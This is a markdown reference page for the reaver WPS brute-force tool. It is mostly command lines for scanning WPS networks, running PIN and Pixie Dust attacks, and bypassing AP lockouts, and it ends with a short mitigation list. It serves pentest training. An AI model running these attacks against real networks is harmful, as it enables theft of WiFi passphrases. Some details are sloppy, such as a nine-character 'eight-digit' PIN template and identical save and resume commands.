---
title: reaver
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - wps
  - pin
  - brute_force
  - brute_force
  - brute_force
difficulty: intermediate
os: linux
install: sudo apt install reaver
github: https://github.com/t6x/reaver-wps-fork-t6x
related:
  - pixiewps
  - bully
  - wash
  - wifite
---

# reaver

## Chapter 1: Overview

**reaver** performs brute force attacks against WiFi Protected Setup (WPS) PIN numbers to recover WPA/WPA2 passphrases. It includes the **wash** utility for identifying WPS-enabled access points.

### Key Features

- **WPS PIN brute force**: Systematic PIN guessing
- **Session persistence**: Resume interrupted attacks
- **Multiple attack modes**: Standard, Pixie Dust
- **Wash scanner**: Identify WPS-enabled networks
- **Rate limiting bypass**: Handles WPS lockouts

### WPS PIN Structure

```
PIN = XXXXYYYYY (8 digits)

First 4 digits: X1X2X3X4
Last 4 digits:  Y1Y2Y3Y4 + Checksum (Y4)

Total attempts: ~11,000 (reduced by checksum math)
```

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install reaver
```

**Install size**: 851 KB

### Configure Monitor Mode

```bash
airmon-ng start wlan0
```

### Update OUI Database

```bash
wash --update
```

---

## Chapter 3: WPS Scanning with Wash

### Scan All Networks

```bash
wash -i wlan0mon
```

### Scan Specific Channel

```bash
wash -i wlan0mon -c 6
```

### Show All APs (Including Non-WPS)

```bash
wash -i wlan0mon -a
```

### JSON Output

```bash
wash -i wlan0mon -j
```

### Scan Mode

```bash
wash -i wlan0mon -s
```

**Output fields**: BSSID, Ch, dBm, WPS Version, Lock status, Vendor, ESSID

---

## Chapter 4: Standard PIN Attack

### Basic Attack

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF
```

### Verbose Output

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
```

### Specify Channel

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
```

### Save Session

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s session_file
```

### Resume Session

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s session_file
```

---

## Chapter 5: Pixie Dust Attack

### Offline Attack

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K
```

### Small DH Keys

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -S
```

### Capture and Compute

```bash
# Capture with reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vvv

# Or with pixiewps directly
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE>
```

---

## Chapter 6: Advanced Options

### Set PIN Delay

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5
```

### Set Lock Delay

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -l 60
```

### Ignore Lock State

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -L
```

### Max Attempts

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -g 100
```

### Recurring Delay

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -r 10:5
```

### Windows 7 Compatibility

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -w
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Quick WPS Assessment

```bash
wash -i wlan0mon
reaver -i wlan0mon -b TARGET_BSSID -vv
```

### Scenario 2: Full PIN Attack

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vvv -s session
```

### Scenario 3: Against Locked AP

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -L -l 120 -d 10
```

---

## Chapter 8: Mitigation & Defense

**Critical defenses:**

- **Disable WPS completely** (most important)
- Use WPA3-SAE
- Enable AP lockout protection
- Monitor for WPS enumeration
- Regular firmware updates
- Consider enterprise authentication

---

## Resources

- [reaver GitHub](https://github.com/t6x/reaver-wps-fork-t6x)
- [WPS Attack Documentation](https://www.aircrack-ng.org/doku.php?id=reaver)
- [WPS Security Analysis](https://www.wi-fi.org/discover-wi-fi/security)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
